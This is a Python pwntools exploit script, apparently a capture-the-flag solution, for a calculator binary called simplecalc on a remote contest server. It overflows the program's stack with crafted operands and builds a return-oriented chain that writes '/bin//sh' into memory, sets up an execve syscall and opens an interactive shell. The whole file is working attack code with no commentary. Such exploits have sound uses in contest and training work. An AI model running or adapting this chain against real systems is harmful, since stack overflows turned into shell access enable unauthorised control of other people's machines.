from pwn import *
def push(addr):
	p.sendline('1')
	p.recvuntil(':')
	p.sendline('4294967295')
	p.recvuntil(':')
	p.sendline(str(addr+1))
	p.recvuntil('>')
def zero(n):
	for i in range(n):
		p.sendline('2')
		p.recvuntil(':')
		p.sendline('4294967295')
		p.recvuntil(':')
		p.sendline('4294967295')
		p.recvuntil('>')

#p=process('./pwn2')
p=remote('simplecalc.bostonkey.party','5400')
p.recvuntil(':')
p.sendline('255')
p.recvuntil('>')
for i in range(12):
	push(0x63636363)
zero(2)
for i in range(4):
	push(0x63636363)
push(0x0000000000401c87) # pop rsi ; ret
zero(1)
push(0x00000000006c1060) # @ .data
zero(1)
push(0x000000000044db34) # pop rax ; ret
zero(1)
push(0x6E69622F) #/bin//sh
push(0x68732F2F)
push(0x0000000000470f11) # mov qword ptr [rsi], rax ; ret
zero(1)
push(0x0000000000401c87) # pop rsi ; ret
zero(1)
push(0x00000000006c1068) # @ .data + 8
zero(1)
push(0x000000000041c61f) # xor rax, rax ; ret
zero(1)
push(0x0000000000470f11) # mov qword ptr [rsi], rax ; ret
zero(1)
push(0x0000000000401b73) # pop rdi ; ret
zero(1)
push(0x00000000006c1060) # @ .data
zero(1)
push(0x0000000000401c87) # pop rsi ; ret
zero(1)
push(0x00000000006c1068) # @ .data + 8
zero(1)
push(0x0000000000437a85) # pop rdx ; ret
zero(1)
push(0x00000000006c1068) # @ .data + 8
zero(1)
push(0x000000000041c61f) # xor rax, rax ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x0000000000463b90) # add rax, 1 ; ret
zero(1)
push(0x00000000004648e5) # syscall ; ret
p.sendline('5')
p.interactive()